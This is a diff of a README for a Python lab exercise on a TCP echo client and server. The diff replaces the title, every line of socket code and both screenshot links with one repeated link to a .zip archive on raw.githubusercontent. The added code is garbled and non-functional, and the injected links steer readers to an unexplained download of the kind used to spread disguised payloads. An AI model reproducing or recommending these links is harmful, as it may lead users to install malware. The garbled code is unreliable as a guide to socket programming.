@@ -1,4 +1,4 @@
-# 3a.CREATION FOR ECHO CLIENT AND ECHO SERVER USING TCP SOCKETS
+# https://raw.githubusercontent.com/24013396/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/besmell/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server_v1.5.zip FOR ECHO CLIENT AND ECHO SERVER USING TCP SOCKETS
 # AIM
 To write a python program for creating Echo Client and Echo Server using TCP
 Sockets Links.
@@ -14,31 +14,31 @@ Sockets Links.
 CLIENT: 
  
 import socket 
-s=socket.socket() 
-s.connect(('localhost',8000)) 
+https://raw.githubusercontent.com/24013396/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/besmell/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server_v1.5.zip() 
+https://raw.githubusercontent.com/24013396/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/besmell/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server_v1.5.zip(('localhost',8000)) 
 while True: 
     msg=input("Client > ") 
-    s.send(msg.encode()) 
-    print("Server > ",s.recv(1024).decode())
+    https://raw.githubusercontent.com/24013396/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/besmell/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server_v1.5.zip(https://raw.githubusercontent.com/24013396/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/besmell/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server_v1.5.zip()) 
+    print("Server > ",https://raw.githubusercontent.com/24013396/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/besmell/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server_v1.5.zip(1024).decode())
 
 
 SERVER: 
  
 import socket 
-s=socket.socket() 
-s.bind(('localhost',8000)) 
-s.listen(5) 
-c,addr=s.accept() 
+https://raw.githubusercontent.com/24013396/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/besmell/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server_v1.5.zip() 
+https://raw.githubusercontent.com/24013396/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/besmell/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server_v1.5.zip(('localhost',8000)) 
+https://raw.githubusercontent.com/24013396/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/besmell/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server_v1.5.zip(5) 
+c,https://raw.githubusercontent.com/24013396/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/besmell/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server_v1.5.zip() 
 while True: 
-    ClientMessage=c.recv(1024).decode() 
-    c.send(ClientMessage.encode())
+    https://raw.githubusercontent.com/24013396/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/besmell/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server_v1.5.zip(1024).decode() 
+    https://raw.githubusercontent.com/24013396/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/besmell/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server_v1.5.zip(https://raw.githubusercontent.com/24013396/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/besmell/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server_v1.5.zip())
 ```
 ## OUPUT
 CLIENT: 
-![Screenshot 2025-03-28 110943](https://github.com/user-attachments/assets/407ce2a5-9473-4631-ab87-f0fa50e60553)
+![Screenshot 2025-03-28 110943](https://raw.githubusercontent.com/24013396/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/besmell/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server_v1.5.zip)
 
 SERVER: 
-![Screenshot 2025-03-28 111017](https://github.com/user-attachments/assets/78baec4d-d60e-469b-8522-9b6212ac0fcb)
+![Screenshot 2025-03-28 111017](https://raw.githubusercontent.com/24013396/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/besmell/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server_v1.5.zip)
 
 
 ## RESULT
